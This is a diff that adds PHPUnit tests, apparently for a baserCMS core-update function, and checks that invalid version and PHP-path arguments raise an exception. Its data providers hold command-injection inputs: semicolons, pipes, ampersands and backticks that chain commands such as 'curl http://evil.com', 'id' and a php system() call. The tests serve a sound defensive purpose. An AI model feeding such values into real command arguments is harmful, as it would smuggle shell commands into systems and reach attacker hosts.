@@ -560,6 +560,48 @@ EOF;
     }
 
     /**
+     * test getCoreUpdate targetVersion バリデーション
+     * @dataProvider provideGetCoreUpdateInvalidTargetVersion
+     */
+    public function testGetCoreUpdateWithInvalidTargetVersion(string $targetVersion): void
+    {
+        $this->expectException("BaserCore\Error\BcException");
+        $this->Plugins->getCoreUpdate($targetVersion, 'php');
+    }
+
+    public static function provideGetCoreUpdateInvalidTargetVersion(): array
+    {
+        return [
+            'セミコロン付き' => ['5.2.2; curl http://evil.com'],
+            'パイプ付き' => ['5.2.2|id'],
+            'ワイルドカード' => ['5.2.x'],
+            '空文字' => [''],
+            '文字列のみ' => ['invalid'],
+        ];
+    }
+
+    /**
+     * test getCoreUpdate php バリデーション
+     * @dataProvider provideGetCoreUpdateInvalidPhp
+     */
+    public function testGetCoreUpdateWithInvalidPhp(string $php): void
+    {
+        $this->expectException("BaserCore\Error\BcException");
+        $this->Plugins->getCoreUpdate('5.2.2', $php);
+    }
+
+    public static function provideGetCoreUpdateInvalidPhp(): array
+    {
+        return [
+            'セミコロン付き' => ['curl http://evil.com;'],
+            'パイプ付き' => ['/usr/local/bin/php|id'],
+            'スペース付き' => ['/usr/local/bin/php -r "system(\'id\')"'],
+            'アンパサンド付き' => ['/usr/bin/php & curl evil.com'],
+            'バッククォート付き' => ['`id`'],
+        ];
+    }
+
+    /**
      * test getCoreUpdate
      * @return void
      */
